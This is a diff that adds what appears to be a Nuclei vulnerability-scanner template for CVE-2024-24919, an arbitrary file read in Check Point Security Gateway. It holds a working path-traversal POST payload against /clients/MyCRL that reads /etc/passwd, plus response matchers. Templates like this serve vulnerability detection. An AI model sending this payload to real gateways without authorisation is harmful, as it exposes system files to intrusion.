@@ -1,0 +1,37 @@
+id: check-point-security-gateway-mycrl-anyfile-read
+
+info:
+  name: Check Point Security Gateway MyCRL Arbitrary File Read (CVE-2024-24919)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-24919
+  description: |
+    A vulnerability in Check Point Security Gateway allows arbitrary file read via the MyCRL endpoint. The issue can be exploited by sending a crafted payload.
+
+http:
+  - raw:
+      - |
+        POST /clients/MyCRL HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        aCSHELL/../../../../../../../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "Check Point"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
